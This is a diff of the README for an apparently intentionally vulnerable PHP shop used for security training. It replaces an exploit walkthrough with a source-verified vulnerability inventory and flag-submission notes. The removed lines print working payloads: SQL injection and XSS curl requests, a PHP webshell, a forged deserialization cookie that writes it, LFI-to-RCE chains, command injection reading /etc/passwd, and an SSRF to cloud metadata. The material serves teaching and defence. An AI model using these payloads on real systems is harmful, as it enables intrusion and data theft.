@@ -1,318 +1,169 @@
-# ShopEase (PHP) — Vulnerability Guide
+# ShopEase PHP lab: verified vulnerability inventory
 
-**For authorized security testing / learning only. Run locally. Never deploy publicly or use real data.**
+**Scope:** source review of this PHP training application, not a penetration test. Use only a
+local, isolated lab with synthetic data and accounts you are authorized to test. Do not use the
+public Render deployment, real customer data, or production credentials for exercises.
 
-Same 5-page shop concept as the other editions, this time plain PHP + PDO/SQLite (classic LAMP-style, no framework) — so the PHP-specific classics show up: Local File Inclusion, Unrestricted File Upload, and PHP Object Injection, in addition to the SQLi/XSS/broken-access-control staples. Two of the bugs chain into full remote code execution, which is worth walking through end to end.
+## Important status
 
-Demo accounts: `alice/alice123`, `bob/bobpass`, `admin/admin!2024`
+The vulnerability switches in `config.php` are not a reliable checklist of working exercises.
+There are 65 defined `VULN_*` switches: 64 are `true` and `VULN_COMMAND_INJECTION` is `false`,
+but many enabled switches do not have corresponding behavior in this PHP app. The findings
+below distinguish code that was confirmed from labels that are only configured. This is a
+source-based inventory, not a claim that every toggle or every possible bug was dynamically
+tested.
 
----
+The current source also differs from older versions of this guide: for example, product image
+uploads are validated and renamed, checkout recalculates prices from the database, and product
+comments/reviews are not implemented on the product page. The old exploit examples have
+therefore been removed rather than presented as working instructions.
 
-## Page 1 — Login (`login.php`)
-**SQL Injection (auth bypass) — CWE-89**
-```
-curl -X POST http://127.0.0.1:8081/login.php -d "username=admin' --&password=x"
-```
-**Insecure Deserialization / PHP Object Injection — CWE-502**
-Checking "Remember me" sets a cookie that's just `base64(serialize($userArray))` — no HMAC, no signature. It's unserialized straight back on a later request (`includes/session_check.php`). Because `config.php` (loaded on every page) always defines a `Logger` class whose destructor does `file_put_contents($this->logFile, $this->logMsg, FILE_APPEND)` with both properties attacker-controlled, you can forge a cookie that writes an arbitrary PHP file anywhere writable the moment the request finishes:
-```php
-<?php
-class Logger { public $logFile; public $logMsg; }
-$o = new Logger();
-$o->logFile = '/path/to/vulnapp-php/uploads/forged.php';
-$o->logMsg  = '<?php echo shell_exec($_GET["c"]); ?>';
-echo base64_encode(serialize($o));
-```
-```
-curl --cookie "remember=<forged-value>" http://127.0.0.1:8081/login.php
-curl "http://127.0.0.1:8081/admin.php?page=../uploads/forged.php&c=id"
-```
-**Fix:** sign tokens (HMAC) or use a random opaque token looked up server-side instead of serializing data into the cookie at all; never `unserialize()` client input (use `json_decode` instead, or `unserialize($str, ['allowed_classes' => false])` at minimum).
+## Confirmed vulnerable behavior
 
-## Page 2 — Product search (`products.php`)
-**SQL Injection (UNION-based) — CWE-89**
-```
-curl "http://127.0.0.1:8081/products.php?q=%27%20UNION%20SELECT%20id,username,password,email%20FROM%20users--"
-```
-**Fix:** `PDO::prepare()` with bound parameters, never string-interpolated SQL.
+| Severity | Area | Confirmed behavior | Main source |
+|---|---|---|---|
+| Critical | Remember-me deserialization | A client cookie is decoded and unserialized with classes enabled; resulting fields can set session identity/role. The `Logger` destructor writes to a path and content held in object properties, creating a dangerous file-write gadget. | `includes/session_check.php`, `config.php` |
+| High | SQL injection | Search, login, and User-Agent logging concatenate request-controlled values into SQL. Search remains injectable even though matching is case-insensitive. | `api/search.php`, `login.php`, `includes/log_ua.php` |
+| High | Admin access and include | A URL-path quirk skips the admin check; the admin page also includes a page path derived from request input without an allowlist. The exact path behavior depends on the web server. | `admin.php` |
+| High | Order IDOR / privacy disclosure | Order lookup can be based only on an order ID, returning customer email, shipping address, items, total, and status without verifying ownership. | `order_success.php` |
+| High | Receipt path traversal | A caller-supplied filename is appended to `uploads/` and read without checking that the resolved path stays inside that directory. | `download_receipt.php` |
+| High | Diagnostic disclosure | The debug page exposes `phpinfo()` and verbose errors are enabled. The Docker startup applies Basic Auth, but deployment configuration must continue to protect the lab. | `debug.php`, `config.php`, `Dockerfile` |
+| Medium | Profile-edit IDOR | The edit handler skips its ownership check when `VULN_IDOR_PROFILE_EDIT` is true, and updates the requested account's balance. Reachability depends on the surrounding admin-page routing. | `pages/edit_user.php`, `admin.php` |
+| Medium | SSRF / local resource fetch | The admin image-fetch handler passes the submitted URL to `file_get_contents()` without destination restrictions. | `pages/fetch_remote_image.php` |
+| Medium | Plaintext passwords and session fixation | Registration and demo seeding store plaintext passwords; successful login does not rotate the session ID under the current configuration. | `register.php`, `config.php`, `login.php` |
+| Medium | CSRF and unsafe state-changing requests | State changes lack CSRF tokens. Order approval and cart removal use GET requests. | `pages/orders.php`, `cart.php`, `checkout.php` |
+| Low | Missing upper quantity bound | The legacy quantity-update module has no upper-bound check when the integer-overflow toggle is on. The main cart flow enforces a lower bound of one, but no upper limit. | `pages/update_cart_quantity.php`, `cart.php` |
+| Low | Missing browser security headers | The shared header omits common security headers with `VULN_MISSING_HEADERS` enabled. | `includes/header.php` |
+| Low | Backup file in document root | `config.php.bak` is present in the web root. Whether it can be fetched depends on the web server and Basic Auth gate; treat it as sensitive and remove it from deploy artifacts. | `config.php.bak`, `Dockerfile` |
 
-## Page 3 — Profile (`profile.php?id=`)
-**IDOR — CWE-639**
-No check that the logged-in session user matches `?id=`. Walk `?id=1`, `2`, `3` to read every user's SSN.
-**Fix:** compare `$_SESSION['user_id']` to the requested id (or require admin role) before returning data.
+Severity indicates the potential impact in a lab context, not whether the behavior is reachable
+from the public Internet. The Docker Basic Auth gate is part of the deployment boundary; keep
+it enabled and do not treat these intentionally vulnerable pages as production-ready.
 
-## Page 4 — Product detail (`product.php?id=`)
-**Stored XSS — CWE-79**
-Comment body is echoed with zero escaping:
-```
-curl -X POST "http://127.0.0.1:8081/product.php?id=1" -d "action=comment&author=t&body=<script>alert(document.cookie)</script>"
-```
-**Unrestricted File Upload — CWE-434**
-The "Upload a product photo" form trusts the client-supplied filename/extension outright and saves it straight into a web-reachable `uploads/` folder:
-```
-curl -X POST "http://127.0.0.1:8081/product.php?id=1" -F "avatar=@shell.php;filename=shell.php"
-```
-where `shell.php` contains e.g. `<?php echo shell_exec($_GET['c']); ?>`.
-**Fix:** escape all output (`htmlspecialchars`), add a CSRF token to the comment form; for uploads, validate real content (not just the extension), re-encode images through a library, store outside the web root with a randomized name, and serve them through a controller that sets a safe `Content-Type`.
+## Toggle inventory
 
-## Page 5 — Admin (`admin.php`)
-**Broken access control — CWE-284**
-Gated only by a client-supplied `is_admin` cookie that defaults to allow when absent — just visit the page, or set it in devtools.
-**Local File Inclusion — CWE-98 / CWE-22**
-```
-curl "http://127.0.0.1:8081/admin.php?page=../../../../etc/passwd"
-```
-The real payoff is chaining this with the upload bug above — `include()` runs whatever PHP it's given, so including the uploaded shell executes it even though `uploads/` isn't meant to be a script-execution path:
-```
-curl "http://127.0.0.1:8081/admin.php?page=../uploads/shell.php&c=id"
-# -> WEBSHELL_OK:uid=0(root) gid=0(root) ...
-```
-**OS command injection — CWE-78**
-```
-curl -X POST http://127.0.0.1:8081/admin.php -d "host=127.0.0.1; cat /etc/passwd"
-```
-**Fix:** real server-side role check from the session; for the page switcher, use an allowlist of known page keys mapped to fixed file paths (never pass user input to `include()`); for ping, avoid `shell_exec` string concatenation — validate the host against a strict pattern or use a library.
+All values below reflect the current definitions in `config.php`. “Enabled” means only that the
+constant is `true`; it does **not** confirm an implemented or reachable challenge.
 
-## Page 6 — Register (`register.php`)
-**Mass assignment — CWE-915**, **User enumeration — CWE-204**, **Weak password policy / plaintext storage — CWE-521 / CWE-256**
-The HTML form only has username/email/password/confirm, but the backend trusts any POST field
-named `is_admin` or `ssn`, so a raw request can register as an admin directly:
-```
-curl -X POST http://127.0.0.1:8081/register.php \
-  -d "username=evil&password=1&confirm=1&is_admin=1&ssn=111-11-1111"
-```
-Registering an existing username returns a distinct "already taken" message (enumerate valid
-usernames), any password (even `1`) is accepted with no policy, there is no rate limiting, and the
-password is stored in plaintext just like the seeded accounts.
-**Fix:** allowlist writable fields (never `is_admin`), return a generic message, enforce a password
-policy + hashing (`password_hash()`), add throttling/email verification.
+### Authentication, sessions, and SQL
 
----
+- Enabled: `VULN_SQLI_PRODUCT_SEARCH`, `VULN_HEADER_SQLI`, `VULN_SQLI_LOGIN`,
+  `VULN_WEAK_PASSWORD_HASHING`, `VULN_NO_RATE_LIMITING`, `VULN_PREDICTABLE_SESSIONS`,
+  `VULN_SESSION_FIXATION`, `VULN_USERNAME_ENUMERATION`, `VULN_INSECURE_DESERIALIZATION`,
+  `VULN_WEAK_REMEMBER_ME`, `VULN_PREDICTABLE_RESET_TOKEN`, `VULN_SQL_COMMENT_FILTER_BYPASS`.
+- Confirmed in current PHP code: search/login/logging SQL injection, untrusted remember-cookie
+  deserialization, plaintext passwords, and session fixation.
+- Not demonstrated: rate limiting, predictable session IDs, predictable password-reset tokens,
+  or a SQL comment-filter bypass exercise. Username enumeration does not distinguish ordinary
+  failed logins, though SQL errors may be disclosed.
 
-## The two RCE chains, start to finish
-1. **Upload → LFI:** upload `shell.php` via the product page's photo form, then hit `admin.php?page=../uploads/shell.php&c=<command>`.
-2. **Object injection → LFI:** forge a `remember` cookie that writes a PHP payload via the `Logger` gadget, send one request to trigger the write, then include it the same way.
+### Access control and business logic
 
-Both land on the same `admin.php?page=` sink, which is a good illustration of why *any* single critical bug (the LFI) becomes much more dangerous once *any* way to place a file on disk exists elsewhere in the app, even in an "unrelated" feature.
+- Enabled: `VULN_IDOR_ORDER_VIEW`, `VULN_PATH_TRAVERSAL_INCLUDE`,
+  `VULN_BROKEN_ACCESS_CONTROL`, `VULN_IDOR_PROFILE_EDIT`,
+  `VULN_PRICE_QUANTITY_TAMPERING`, `VULN_MASS_ASSIGNMENT_CHECKOUT`,
+  `VULN_RACE_CONDITION`, `VULN_RACE_MULTI_ENDPOINT`, `VULN_RACE_SINGLE_PACKET`,
+  `VULN_RACE_DOUBLE_SPEND`, `VULN_RACE_VOUCHER_OVERRUN`, `VULN_WORKFLOW_STEP_SKIP`,
+  `VULN_ROUNDING_ERROR`, `VULN_INTEGER_OVERFLOW`, `VULN_NEGATIVE_REFUND`,
+  `VULN_LOYALTY_ABUSE`, `VULN_HORIZONTAL_PRIV_ESC`, `VULN_VERTICAL_PRIV_ESC`,
+  `VULN_HTTP_METHOD_SWAP`, `VULN_URL_QUIRKS`, `VULN_SPOOFABLE_ACCESS_CONTROL`,
+  `VULN_OPEN_REDIRECT`, `VULN_HTTP_VERB_TAMPERING`, `VULN_UNICODE_NORMALIZATION`,
+  `VULN_NULL_BYTE_INJECTION`, `VULN_CASE_SENSITIVITY_BYPASS`, `VULN_TRAILING_DOT_SLASH`.
+- Confirmed: order IDOR, profile edit IDOR, URL-quirk admin-check bypass, unvalidated local
+  include, and missing upper bound on the legacy quantity-update handler.
+- Not demonstrated: checkout price tampering or mass assignment; checkout uses database prices
+  and session cart data. The current search change intentionally makes product-name matching
+  case-insensitive, so it is not a case-sensitivity-bypass exercise.
+- `VULN_PATH_TRAVERSAL_INCLUDE` and `VULN_BROKEN_ACCESS_CONTROL` are not the switches governing
+  the observed admin include and URL-quirk behavior. `VULN_HTTP_VERB_TAMPERING` has a check in
+  a helper that no current page calls.
 
-## Also present throughout
-- Verbose SQL error messages returned to the client (CWE-209).
-- Plaintext password storage (CWE-256); SSNs returned by multiple endpoints (CWE-359).
-- No CSRF tokens anywhere (CWE-352).
-- `uploads/` and `pages/` have no `.htaccess`/web-server hardening restricting execution or directory listing.
+### Browser/client-side and CSRF
 
-## Page 7 - Authentication (login.php)
-**SQL Injection (Auth Bypass) — CWE-89**
-```
-curl -X POST http://127.0.0.1:8000/login.php -d "username=admin' --&password=anything"
-```
-**Weak Password Hashing — CWE-256**
-Passwords are stored in plaintext. If `VULN_WEAK_PASSWORD_HASHING` is enabled, the system uses direct comparison instead of `password_verify()`.
-**Fix:** Always use `password_hash()` and `password_verify()`.
+- Enabled: `VULN_REFLECTED_XSS`, `VULN_STORED_XSS`, `VULN_CLICKJACKING_DRAG`,
+  `VULN_CSRF`, `VULN_CSRF_METHOD_OVERRIDE`, `VULN_CSRF_TOKEN_LEAK`,
+  `VULN_CSRF_FAIL_OPEN`, `VULN_DOM_CLOBBERING`, `VULN_CLIENT_PROTOTYPE_POLLUTION`,
+  `VULN_POSTMESSAGE_NO_ORIGIN`, `VULN_UNSAFE_EVAL`, `VULN_CLIENT_SIDE_VAL_TRUST`.
+- Confirmed: missing CSRF defenses on selected state-changing operations.
+- Not demonstrated: reflected/stored XSS or the listed JavaScript/client-side challenge
+  behaviors in the current PHP pages. The older product review/comment examples do not match
+  current `product.php`.
 
-## Page 8 - Products Search (products.php)
-**Reflected XSS — CWE-79**
-```
-curl "http://127.0.0.1:8000/products.php?q=<script>alert('XSS')</script>"
-```
-**Fix:** Always use `htmlspecialchars()` when echoing user-controlled input.
+### Files, network, and information exposure
 
-## Page 9 - Product Reviews (product.php)
-**Stored XSS — CWE-79**
-```
-curl -X POST http://127.0.0.1:8000/product.php?id=1 -d "comment=<script>alert('XSS')</script>"
-```
-**CSRF — CWE-352**
-```
-# Submitting a POST request without a valid CSRF token.
-curl -X POST http://127.0.0.1:8000/product.php?id=1 -d "comment=Nice product!"
-```
-**Fix:** Implement anti-CSRF tokens for all state-changing operations and escape output for stored data.
+- Enabled: `VULN_UNRESTRICTED_FILE_UPLOAD`, `VULN_PATH_TRAVERSAL_DOWNLOAD`, `VULN_SSRF`,
+  `VULN_EXPOSED_SOURCE_MAP`, `VULN_COOKIE_DEBUG_MODE`, `VULN_AUTOCOMPLETE_ENABLED`,
+  `VULN_MISSING_CACHE_CONTROL`, `VULN_VERBOSE_API_JSON`, `VULN_VERBOSE_ERRORS`,
+  `VULN_EXPOSED_BACKUPS`, `VULN_HARDCODED_CREDS`, `VULN_DEBUG_ENDPOINTS`,
+  `VULN_MISSING_HEADERS`.
+- Confirmed: receipt path traversal, SSRF handler, debug/config disclosure, verbose errors,
+  missing security headers, and the presence of a backup file.
+- Not confirmed as an unrestricted upload: the product image helper validates image content,
+  permits a small image MIME allowlist, and generates a new filename.
+- Source maps, cookie debug mode, autocomplete, verbose API JSON, and hardcoded-credential
+  behaviors were not demonstrated in the current modules.
 
-## Page 10 - User Profile (pages/edit_user.php)
-**IDOR — CWE-639**
-```
-curl "http://127.0.0.1:8000/admin.php?page=edit_user.php&id=1"
-```
-**Fix:** Verify that the currently authenticated user is authorized to perform the requested edit action.
+### Remaining configured toggles
 
-## Page 11 - Checkout (checkout.php)
-**Price/Quantity Tampering — CWE-20**
-```
-# Manipulating price in POST request
-curl -X POST http://127.0.0.1:8000/checkout.php -d "confirm=1&price[1]=0.01"
-```
-**Mass Assignment — CWE-915**
-```
-# Injecting unauthorized order status
-curl -X POST http://127.0.0.1:8000/checkout.php -d "confirm=1&status=approved"
-```
-**Fix:** Never trust client-submitted data for critical business logic like prices, quantities, or internal status flags. Recalculate everything server-side.
+- Enabled: `VULN_ROUNDING_ERROR` (listed above), `VULN_COMMAND_INJECTION` (**disabled**).
+- No current application behavior was confirmed for command injection; do not enable it or
+  interpret its name as an implemented challenge.
+- `VULN_XXE_IMPORT`, `VULN_PARAMETER_POLLUTION`, `VULN_COUPON_STACKING`, and `VULN_REDOS` are
+  referenced in page modules but are **not defined** in `config.php`. Those routes may raise
+  runtime errors rather than provide reliable exercises.
 
-## Page 12 - Product Image Upload (product.php)
-**Unrestricted File Upload — CWE-434**
-```
-# Uploading a PHP webshell
-curl -F "avatar=@shell.php" http://127.0.0.1:8000/product.php?id=1
-```
-**Fix:** Validate file content (not just extension), rename files to random strings, and store outside the web root.
+## Flags: storage, submission, and availability
 
-## Page 13 - Receipt Download (download_receipt.php)
-**Path Traversal — CWE-22**
-```
-curl "http://127.0.0.1:8000/download_receipt.php?f=../../config.php"
-```
-**Fix:** Sanitize file paths using `basename()` and check that the resolved path is within the allowed directory.
+### Where they are stored
 
-## Page 14 - Admin Image Fetch (pages/fetch_remote_image.php)
-**SSRF — CWE-918**
-```
-curl -X POST http://127.0.0.1:8000/pages/fetch_remote_image.php -d "url=http://169.254.169.254/"
-```
-**Fix:** Do not allow the server to fetch arbitrary URLs provided by the user. If necessary, use an allowlist of domains.
+- Startup adds the named challenge catalog to the active database's `flags` table once. This
+  works with SQLite and PostgreSQL/Neon and does not clear or reset shop records. Each catalog
+  entry receives a generated persistent flag; legacy entries are retained. The same database
+  must be used to discover and submit a flag.
+- The catalog contains named challenge entries, including repeated legacy vulnerability IDs
+  where the inventory maps more than one challenge to that ID. Names, not IDs alone, distinguish
+  those challenges.
+- A valid submission by a signed-in learner is recorded in `hall_of_fame` with a stable user
+  reference, username, email snapshot, flag reference, and timestamp. Existing achievement rows
+  are preserved and remain visible as legacy entries where their flag reference is unavailable.
+- By default, SQLite uses `data/vulnapp.db` (or `$APP_DATA_DIR/vulnapp.db`). If `DATABASE_URL`
+  is configured, the app uses that PostgreSQL database instead. Neon is initialized on normal
+  application startup; no shop-data reset is required for the flag catalog.
 
-## Page 15 - Configuration (config.php)
-**Information Disclosure — CWE-209**
-The application displays verbose error messages if `VULN_VERBOSE_ERRORS` is enabled, potentially revealing stack traces or path information.
+### How a learner claims a flag
 
-**Insecure Backup Files — CWE-530**
-The configuration backup file (`config.php.bak`) is publicly accessible if `VULN_EXPOSED_BACKUPS` is enabled.
+1. Work only through the authorized local lab instance and its exercises. Identify a flag
+   intentionally associated with the challenge you completed. The catalog provides persistent
+   challenge flags; it does not automatically detect or prove that an exploit occurred.
+2. Sign in to the lab and open **Submit Flag** (`/submit_flag.php`).
+3. Paste the exact flag or upload its downloaded plain-text file (up to 16 KB). The upload is
+   read for validation and is not stored on the server. A matching flag is attributed to the
+   current account and
+   appears in the Superadmin **Hall of Heroes** with username, email, flag, vulnerability type,
+   and discovery time. Re-submitting an already-earned flag does not create a duplicate award.
+4. A small PDF certificate downloads immediately after a valid submission. The learner's
+   profile also shows earned challenge names and timestamps; `generate_cert.php` can regenerate
+   a certificate only for an achievement owned by the signed-in learner.
 
-**Missing Security Headers — CWE-16**
-If `VULN_MISSING_HEADERS` is true, the application lacks `X-Frame-Options`, `Content-Security-Policy`, and `X-Content-Type-Options`, making it susceptible to frame-based attacks like Clickjacking.
+Flags are stored in the database, so do not publish their values in documentation or expose
+them in learner-facing catalog pages. A fresh deployment creates catalog values automatically;
+existing shop and achievement rows are not reset.
 
-**Debug Endpoints — CWE-489**
-The `debug.php` page exposes `phpinfo()` if `VULN_DEBUG_ENDPOINTS` is enabled, revealing sensitive server-side configuration.
+### Flag workflow caveats
 
-**Fix:** Disable verbose error logging, restrict access to backup files (do not serve them via web), implement proper security headers, and remove any debug endpoints.
+- A valid flag submission records a self-reported completion; it is not independent proof that
+  the learner exploited the associated vulnerability.
+- The catalog identifies intended challenge topics, but it does not make an unimplemented
+  vulnerability toggle into a working exercise. See the source-verified inventory above.
+- The Hall of Heroes retains the learner's email at submission time so the record remains
+  attributable if the corresponding user account is later removed.
 
-## Page 16 - Registration (register.php)
-**Second-order SQL Injection — CWE-89**
-```
-# Register with a username like: admin'-- 
-# Then trigger it later on an admin page that selects based on this username
-```
-**Fix:** Always use prepared statements for all database interactions.
+## Safe ways to use this guide
 
-## Page 17 - Request Logging (includes/log_ua.php)
-**SQL Injection via HTTP Header — CWE-89**
-```
-# Send a request with a malicious User-Agent header
-curl -H "User-Agent: ' || (SELECT ...) --" http://127.0.0.1:8000/
-```
-**Fix:** Use prepared statements for all database writes.
-
-## Page 18 - Product Search (products.php)
-**Blind Boolean/Time-based SQL Injection — CWE-89**
-```
-# Boolean
-/products.php?q=a' AND 1=1--
-# Time-based
-/products.php?q=a' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--
-```
-**Fix:** Use prepared statements to prevent any SQL query alteration.
-
-## Page 19 - Product Reviews (product.php)
-**Stored XSS (Weak Blacklist) — CWE-79**
-```
-# Bypassing filter
-curl -X POST http://127.0.0.1:8000/product.php?id=1 -d "comment=<scr<script>ipt>alert(1)</script>"
-```
-**Fix:** Use proper output escaping (`htmlspecialchars`) instead of blacklisting patterns.
-
-## Page 20 - User Profile (profile.php)
-**XSS via Attribute Injection — CWE-79**
-```
-# Injecting into an attribute context
-<img src="x" onerror="alert(1)">
-```
-**Fix:** Ensure attribute values are properly quoted and escaped.
-
-## Page 21 - Security Policies (header.php)
-**Weak CSP — CWE-693**
-If `VULN_WEAK_CSP` is enabled, the CSP header might be missing or set to `script-src 'unsafe-inline'`.
-**Fix:** Implement a strong, non-inline Content Security Policy.
-
-## Page 22 - Shopping Cart (cart.php)
-**Horizontal Privilege Escalation — CWE-862**
-```
-# Accessing another user's cart by changing the cart_id parameter
-curl "http://127.0.0.1:8000/cart.php?cart_id=1"
-```
-**Fix:** Validate that the authenticated session user owns the requested cart ID.
-
-## Page 23 - Admin Panel (admin.php)
-**Vertical Privilege Escalation — CWE-284**
-```
-# Bypassing admin check via URL quirk
-curl "http://127.0.0.1:8000/admin.php/"
-```
-**Fix:** Normalize URLs and enforce strict, role-based access control regardless of the path formatting.
-
-## Page 24 - Authentication (includes/session_check.php)
-**Insecure "Remember Me" — CWE-384**
-```
-# Easily forgeable token by serializing array
-php -r 'echo base64_encode(serialize(["user_id"=>1]));'
-```
-**Fix:** Use cryptographically secure, server-side stored opaque tokens with expiration.
-
-## Page 25 - Checkout (checkout.php)
-**Race Condition — CWE-362**
-Multiple concurrent requests can lead to double-spending or stock exhaustion if the database transaction is not atomic.
-**Fix:** Use database transactions (`BEGIN TRANSACTION`, `COMMIT`) and `SELECT ... FOR UPDATE` (or equivalent) to lock records.
-
-**Workflow Bypass — CWE-472**
-```
-# Accessing order_success.php directly without completing checkout.php
-curl http://127.0.0.1:8000/order_success.php?id=1
-```
-**Fix:** Validate the application state and ensure orders cannot be created or viewed without completing the preceding workflow steps.
-
-## Page 26 - XML Import (pages/import_products.php)
-**XXE Injection — CWE-611**
-```xml
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
-<root>&xxe;</root>
-```
-**Fix:** Disable external entity loading in XML parsers (`libxml_disable_entity_loader(true)`).
-
-## Page 27 - Discount Application (pages/apply_discount.php)
-**HTTP Parameter Pollution — CWE-235**
-```
-curl -X POST http://127.0.0.1:8000/pages/apply_discount.php -d "code=SUMMER20&code=WINTER50"
-```
-**Coupon Stacking — CWE-838**
-Applying multiple discount codes to stack savings.
-
-## Page 28 - ReDoS Validation (pages/validate_input.php)
-**ReDoS — CWE-1333**
-```
-curl -X POST http://127.0.0.1:8000/pages/validate_input.php -d "data=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab"
-```
-**Fix:** Avoid nested quantifiers and ambiguous patterns in regex.
-
-## Page 29 - Cart Update (pages/update_cart_quantity.php)
-**Integer Overflow/Negative Value — CWE-190**
-```
-# Send a negative quantity to result in a negative total
-curl -X POST http://127.0.0.1:8000/pages/update_cart_quantity.php -d "product_id=1&quantity=-100"
-```
-**Fix:** Validate quantity ranges server-side.
-
-## Page 30 - Access Control (includes/session_check.php)
-**HTTP Verb Tampering — CWE-284**
-```
-# Bypassing admin constraints by changing GET to POST if logic only guards POST
-curl -X POST http://127.0.0.1:8000/admin.php
-```
-**Fix:** Enforce access control rules consistently regardless of the HTTP method used.
-
-## Page 31 - Input Validation (all pages)
-**Null Byte Injection — CWE-158**
-```
-# Truncating a filename check
-curl "http://127.0.0.1:8000/download_receipt.php?f=config.php%00.jpg"
-```
-**Fix:** Use modern filesystem APIs that are immune to null-byte truncation.
+- Run the lab only on localhost or an isolated disposable environment, with synthetic records.
+- The PHP app requires the deployment Basic Auth variables and a `SUPERADMIN_KEY`; keep the
+  Render instance protected and do not use it for exercises.
+- Start with the confirmed issues above. A configured toggle that is not mapped to code is not
+  a working challenge.
+- This inventory is a point-in-time source review. Re-audit after changes to code, deployment,
+  PHP version, or web-server routing.
